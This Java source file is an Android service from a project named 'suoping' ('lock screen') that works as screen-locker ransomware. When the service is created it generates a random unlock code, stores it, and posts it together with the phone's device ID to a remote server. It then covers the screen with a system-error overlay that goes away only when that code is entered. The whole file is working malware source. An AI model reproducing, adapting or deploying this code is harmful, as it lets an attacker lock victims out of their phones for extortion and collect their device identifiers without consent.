package com.example.a13251.suoping;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.os.Binder;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;

import java.io.FileDescriptor;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by 13251 on 2018/3/11.
 */

public class myService extends Service {
    private WindowManager mWinddowManager;
    private WindowManager.LayoutParams mLayoutParams;
    public View mView;
    private MyBinder mBinder=new MyBinder();
    private Button button;
    private EditText editText;
    private SharedPreferences sp;
    private Encrypt encrypt=new Encrypt();
    private String DeviceId;
    private httpConnection con=new httpConnection();
    public class MyBinder extends Binder{
        myService getService(){
            return myService.this;
        }
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    @Override
    public void onCreate() {
        int ran= (int) (Math.random()*100000);
        String test=encrypt.encrypt(String.valueOf(ran));
        saveEncryResult(getApplicationContext(),test);
        Log.d("encrypt",getShareString());
        DeviceId=getDeviceID(getApplicationContext());
        Map<String,String> maps=new HashMap<>();
        maps.put("deviceId",DeviceId);
        maps.put("pass",test);
        con.doHttpPost(maps);
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, final int startId) {
        mWinddowManager= (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);
        mLayoutParams=new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                2010,
                1280,
                PixelFormat.TRANSPARENT
        );
        mView= LayoutInflater.from(getApplication()).inflate(R.layout.top_activity,null);
        button= (Button) mView.findViewById(R.id.decrypt);
        editText= (EditText) mView.findViewById(R.id.editText);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String pass=encrypt.encrypt(editText.getText().toString());
                Log.d("pass",pass);
                if(pass.equals(getShareString())){
                    mWinddowManager.removeView(mView);
                    stopSelf();
                }
            }
        });
        mWinddowManager.addView(mView,mLayoutParams);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    public void saveEncryResult(Context context,String result){
        sp=context.getSharedPreferences("magician",MODE_PRIVATE);
        SharedPreferences.Editor editor=sp.edit();
        editor.putString("pass",result);
        editor.commit();

    }
    public String getShareString(){
        if(sp!=null){
            return  sp.getString("pass","");
        }else{
            return null;
        }

    }
    private String getDeviceID(Context context){
        TelephonyManager tm = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        if (tm != null) {
            return tm.getDeviceId();
        }
        return null;
    }
}
